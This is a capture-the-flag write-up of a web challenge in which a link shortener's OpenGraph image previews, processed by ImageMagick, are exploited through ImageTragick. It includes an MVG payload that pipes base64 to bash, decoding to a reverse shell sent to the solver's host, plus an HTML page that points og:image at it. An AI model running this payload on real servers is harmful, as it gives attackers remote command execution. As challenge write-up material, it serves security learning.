# Campus Link - Eschaton 2025

### Description:

```
No matter how many times I've RickRolled my friends it never felt enough. Therefore I've made a hobby website for you guys to RickRoll your buddies 😜. Check it out. You can paste in any link and it will shorten those to a slug of your preference. No where on the website does it show that this is a RickRoll shortener therefore nobody will find out untill they fall for it 🤣.

Solves: 2
```

This was the one with the second leasst points. I got it why people were frustrated 🤣 I wonder how many times you people got rickrolled.
Anyway coming to the challenge

![Pasted image 20260201084015.png](screenshots/Pasted%20image%2020260201084015.png)

- Register on the portal with a test credentials
- Login

Now while using burpsuite try creating new links.
Observing the requests, there is nothing weird.
![Pasted image 20260201084205.png](screenshots/Pasted%20image%2020260201084205.png)
![Pasted image 20260201084131.png](screenshots/Pasted%20image%2020260201084131.png)

Except one thing.

![Pasted image 20260201084236.png](screenshots/Pasted%20image%2020260201084236.png)

where did this come from?

ok so I didnt give any icon or banner for preview. So either its doing it its own or doing it with the help of something else. We dont know that so lets just try figuring out ourselves.
Lets try setting up our own server and see what its looking for.

![Pasted image 20260201084741.png](screenshots/Pasted%20image%2020260201084741.png)

![Pasted image 20260201090046.png](screenshots/Pasted%20image%2020260201090046.png)

so its requesting something. And the image doesnt have preview there. But if you think abuot it what are those previews? Screenshots? I dont think so the app is too fast to be screenshoted. So what else.
Comes OpenGraph Metadata:

"Open Graph metadata is a set of HTML tags that tell social media platforms how a webpage should look when shared. It controls the preview card — title, description, and image — instead of letting the platform guess. When someone pastes your link into WhatsApp, Discord, or Facebook, those platforms read these tags to generate a clean preview."

<head>
  <meta property="og:title" content="My Blog Post">
  <meta property="og:description" content="A short summary of the article">
  <meta property="og:image" content="https://example.com/preview.jpg">
  <meta property="og:url" content="https://example.com/post">
  <meta property="og:type" content="article">
</head>
<head>
  <meta property="og:title" content="My Blog Post">
  <meta property="og:description" content="A short summary of the article">
  <meta property="og:image" content="https://example.com/preview.jpg">
  <meta property="og:url" content="https://example.com/post">
  <meta property="og:type" content="article">
</head>
```html
<head>
  <meta property="og:title" content="My Blog Post">
  <meta property="og:description" content="A short summary of the article">
  <meta property="og:image" content="https://example.com/preview.jpg">
  <meta property="og:url" content="https://example.com/post">
  <meta property="og:type" content="article">
</head>

````
This makes shared links show a proper title, text, and image instead of a plain URL. That is how we get previews in discord and social media. Lets try setting up an image as metadaa. Download random Image from google and try setting it up:

![Pasted image 20260201090555.png](screenshots/Pasted%20image%2020260201090555.png)

![Pasted image 20260201090634.png](screenshots/Pasted%20image%2020260201090634.png)


ok now lets try something. Try checking the link of that image now:
The small preview will give: http://node-4.mcsc.space:35425/static/previews/converted_sdsd_d737cc0d.png
Big preview give: http://node-4.mcsc.space:35425/static/previews/original_sdsd_d737cc0d.png
Look at the converted and original part.
Some websites use such shrinking architecture to reduce data. Most of them usually use ( or ones used ) a Tool called ImageMagick

ImageMagick is needed when you want to convert and manipulate images directly from the command line, and the `convert` command is its core tool for doing that. It lets you change image formats, resize, compress, crop, and apply effects automatically — which is useful for servers, scripts, and backend processing where manual editing isn’t possible.
`convert input.png output.jpg`

and thus, if you know that much, and look at the title again, it says: TragicRoll.
And so if you did a bit research, or just went through your memmory. You would remember, the infamous Image Tragick. So goated that it has a website setup:
https://imagetragick.com/ . I am not going through details just check this out if you are interested

Thus, create an exploit.mvg file and point it to your ip
Then create an index.html poitinig towards it
```bash
╰─$ cat index.html
<meta property="og:image" content="working.mvg">
╭─white-devil@devils-lair ~/escaton/tests
╰─$ push graphic-context
viewbox 0 0 640 480
fill 'url(|echo c2ggLWkgNTw+IC9kZXYvdGNwLzE3Mi4xNy4wLjEvMTMzOCAwPCY1IDE+JjUgMj4mNQo= | base64 -d | bash)'
pop graphic-context

````

host it, and:
![Pasted image 20260201092540.png](screenshots/Pasted%20image%2020260201092540.png)

hehe.. Thats not SSRF guys 😭🤣

Also I just wanna clarify something I written the following on `robots.txt`

```
# Message from the Author

Hello, players!
I hope you're enjoying the challenges.
This web challenge is inspired by a real-life security issue I once discovered in an RDP program.
It was actually the first valid bug I found during my bug bounty journey.
Even though it was marked as a duplicate, I was quite happy. Thinking outside the box really paid off!
Back then, this bug was wild, and it still feels special to me.
That's why I created this challenge: as a tribute to that moment.

Have fun!

psychoSherlock
```

But just wanna clarify that this was not the exact vulnerability. I found the imagetragick. But the rest are cooked by myself..
Hope you enjoyed 🙂

psychoSherlock 🕵️‍♂️